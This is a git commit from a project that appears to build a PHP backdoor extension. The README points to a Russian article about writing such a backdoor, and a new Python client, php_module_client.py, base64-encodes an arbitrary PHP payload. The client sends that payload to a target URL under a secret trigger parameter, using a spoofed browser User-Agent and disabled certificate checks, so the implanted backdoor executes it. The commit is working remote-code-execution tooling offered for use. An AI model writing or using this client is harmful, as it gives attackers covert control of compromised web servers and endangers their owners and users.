b38a40fb357ef7bf9dd9148905cad17a73fb26c4
lsd <g00271860@gmit.ie>
2014-11-19 13:15:11 +0000

    started committing shit

--- README.md
+++ README.md
@@ -1,6 +1,12 @@
-Windows:
-http://stackoff.ru/pishem-rasshirenie-bekdor-dlya-php/
+## Build Instructions
 
-Linux:  
+#Windows:
+[Original Russian Article][russian]
+[English 'translation'][english]
+
+#Linux:
 `sudo apt-get install php5-dev`  
 `phpize && ./configure && make`
+
+[russian]: http://stackoff.ru/pishem-rasshirenie-bekdor-dlya-php/
+[english]: http://example.com/
---
+++ client/php_module_client.py
@@ -0,0 +1,34 @@
+#!/usr/bin/python2
+# coding: utf-8
+# php backdoor module client, executes PHP code.
+import sys
+import requests
+
+def php_encoder(php):
+    f = open(php, "r").read()
+    f = f.replace("<?php", "echo 'Starting execution...';")
+    f = f.replace("?>", "echo 'Done!;")
+    encoded = f.encode('base64')
+    encoded = encoded.replace("\n", "")
+    encoded = encoded.strip()
+    code = "base64_decode('%s');" %(encoded)
+    return code
+
+def execute_php(target, trigger_string, code):
+	post_data = {trigger_string: code}
+	headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
+	try:
+		r = requests.post(url=target, data=post_data, headers=headers, verify=False)
+	except Exception, e:
+		sys.exit("[-] Exception hit! Printing:\n %s" %(str(e)))
+	if r.text:
+		print r.text
+
+def main(args):
+    if len(args) != 4:
+        sys.exit("use: %s http://host/index.php secret_string payload.php" %(args[0]))
+    execute_php(target=args[1], trigger_string=args[2], code=php_encoder(args[3]))
+
+
+if __name__ == "__main__":
+    main(args=sys.argv)
